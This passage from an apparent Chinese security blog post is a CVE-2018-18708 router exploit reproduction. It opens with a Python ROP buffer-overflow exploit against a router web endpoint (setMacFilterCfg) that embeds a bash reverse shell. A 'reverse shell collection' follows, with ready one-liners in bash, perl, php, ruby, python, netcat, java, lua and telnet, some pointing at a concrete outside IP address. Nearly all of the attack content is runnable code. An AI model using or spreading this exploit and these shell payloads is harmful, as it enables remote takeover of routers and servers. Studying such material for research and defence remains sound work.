<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:2333/goform/setMacFilterCfg&quot;</span><br>c = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;password=0&quot;</span>&#125;<br>libc_base = <span class="hljs-number">0xf659b000</span><br>system  = libc_base + <span class="hljs-number">0x0005a270</span><br>gadget1 = libc_base + <span class="hljs-number">0x00018298</span><br>gadget2 = libc_base + <span class="hljs-number">0x00040cb8</span><br>cmd = <span class="hljs-string">b&#x27;bash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1&#x27;</span><br><br>p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xA8</span><br>p += <span class="hljs-string">b&#x27;DDDD&#x27;</span><br>p += <span class="hljs-string">b&#x27;EEEE&#x27;</span><br>p += p32(gadget1)<br>p += p32(system)<br>p += p32(gadget2)<br>p += cmd<br><br>d = &#123;<span class="hljs-string">&quot;macFilterType&quot;</span>: <span class="hljs-string">&quot;black&quot;</span>, <span class="hljs-string">&quot;deviceList&quot;</span>: <span class="hljs-string">&#x27;\r&#x27;</span>+ p&#125;<br>r = requests.post(url, cookies = c, data = d)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>





<h2 id="反弹shell大全"><a href="#反弹shell大全" class="headerlink" title="反弹shell大全"></a>反弹shell大全</h2><p>在服务器上开启监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -lvnp 4444<br>nc -vvlp 4444<br></code></pre></td></tr></table></figure>

<p>目标机器开启反弹</p>
<p>bash版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/your_server_ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure>

<p>perl版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;<br></code></pre></td></tr></table></figure>

<p>php版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure>

<p>ruby版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;<br></code></pre></td></tr></table></figure>

<p>python版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure>

<p>nc版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -e /bin/sh 10.0.0.1 1234<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f<br>nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999<br></code></pre></td></tr></table></figure>

<p>java版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">r = Runtime.getRuntime()<br>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br>p.waitFor()<br></code></pre></td></tr></table></figure>

<p>lua版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;<br></code></pre></td></tr></table></figure>

<p>NC版本不使用-e参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mknod /tmp/backpipe p<br>/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe<br> /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1<br> mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe<br></code></pre></td></tr></table></figure>

<p>参考: </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204403">https://www.anquanke.com/post/id/204403</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/118423.htm">https://www.jb51.net/article/118423.htm</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/11/13/security/pwn/arm/">← Next ARMx86学习</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/11/13/security/ctf/compitation/wp-shanghai-syber-2020/">第六届上海大学生网络安全大赛 Pwn WP Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-18708-%E5%A4%8D%E7%8E%B0"><span class="toc-text">CVE-2018-18708 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7-%E7%8E%AF%E5%A2%83"><span class="toc-text">工具+环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">远程实验环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E6%A6%82%E8%BF%B0"><span class="toc-text">简要概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-BE73C"><span class="toc-text">sub_BE73C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-BDA1C"><span class="toc-text">sub_BDA1C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-BD758"><span class="toc-text">sub_BD758</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formSetMacFilterCfg"><span class="toc-text">formSetMacFilterCfg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-BD34C"><span class="toc-text">sub_BD34C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-2B794"><span class="toc-text">sub_2B794</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-41F18"><span class="toc-text">sub_41F18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-2E6F4"><span class="toc-text">sub_2E6F4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-2E128"><span class="toc-text">sub_2E128</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E9%93%BE"><span class="toc-text">触发链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-text">漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91poc"><span class="toc-text">触发poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEgadgets"><span class="toc-text">寻找gadgets</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%A4%A7%E5%85%A8"><span class="toc-text">反弹shell大全</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>